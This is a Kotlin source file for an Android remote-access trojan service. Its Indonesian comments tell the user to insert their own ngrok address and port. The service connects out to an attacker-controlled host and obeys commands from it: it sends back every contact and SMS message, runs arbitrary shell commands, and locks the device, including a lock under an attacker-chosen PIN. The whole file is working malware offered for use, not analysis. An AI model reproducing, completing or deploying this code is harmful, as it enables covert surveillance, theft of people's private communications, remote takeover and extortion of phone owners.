package com.kalxx.rat

import android.app.Service
import android.content.Intent
import android.os.IBinder
import android.provider.ContactsContract
import android.provider.Telephony
import java.io.*
import java.net.Socket
import kotlin.concurrent.thread

class RatService : Service() {
    // --- GANTI IP NGROK LU DI SINI ---
    private val IP_TERMUX = "0.tcp.ngrok.io" 
    private val PORT = 12345 // GANTI PORT NGROK LU

    override fun onCreate() {
        super.onCreate()
        thread {
            try {
                val socket = Socket(IP_TERMUX, PORT)
                val out = PrintWriter(socket.getOutputStream(), true)
                val input = BufferedReader(InputStreamReader(socket.getInputStream()))

                while (true) {
                    val cmd = input.readLine() ?: break
                    when {
                        cmd == "get_ip" -> out.println(java.net.InetAddress.getLocalHost().hostAddress)
                        cmd == "contacts" -> out.println(getContacts())
                        cmd == "sms" -> out.println(getSMS())
                        cmd == "lock" -> lockScreen()
                        cmd.startsWith("hard_lock:") -> hardLock(cmd.substring(10))
                        cmd.startsWith("exec:") -> out.println(execShell(cmd.substring(5)))
                        cmd == "exit" -> { socket.close(); stopSelf(); break }
                    }
                }
            } catch (e: Exception) { e.printStackTrace() }
        }
    }

    private fun getContacts(): String {
        val sb = StringBuilder()
        val cursor = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)
        cursor?.use { while (it.moveToNext()) { sb.append("${it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))}: ${it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER))}\n") } }
        return sb.toString()
    }

    private fun getSMS(): String {
        val sb = StringBuilder()
        val cursor = contentResolver.query(Telephony.Sms.CONTENT_URI, null, null, null, null)
        cursor?.use { while (it.moveToNext()) { sb.append("Dari: ${it.getString(it.getColumnIndexOrThrow(Telephony.Sms.ADDRESS))}\nIsi: ${it.getString(it.getColumnIndexOrThrow(Telephony.Sms.BODY))}\n---\n") } }
        return sb.toString()
    }

    private fun execShell(cmd: String): String {
        val process = Runtime.getRuntime().exec(cmd)
        val reader = BufferedReader(InputStreamReader(process.inputStream))
        val sb = StringBuilder()
        var line: String?
        while (reader.readLine().also { line = it } != null) { sb.append(line).append("\n") }
        return sb.toString()
    }

    private fun lockScreen() {
        val dpm = getSystemService(DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
        val adminComponent = android.content.ComponentName(this, DeviceAdmin::class.java)
        if (dpm.isAdminActive(adminComponent)) dpm.lockNow()
    }

    private fun hardLock(pin: String) {
        val intent = Intent(this, LockScreenService::class.java)
        intent.putExtra("PIN", pin)
        startService(intent)
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
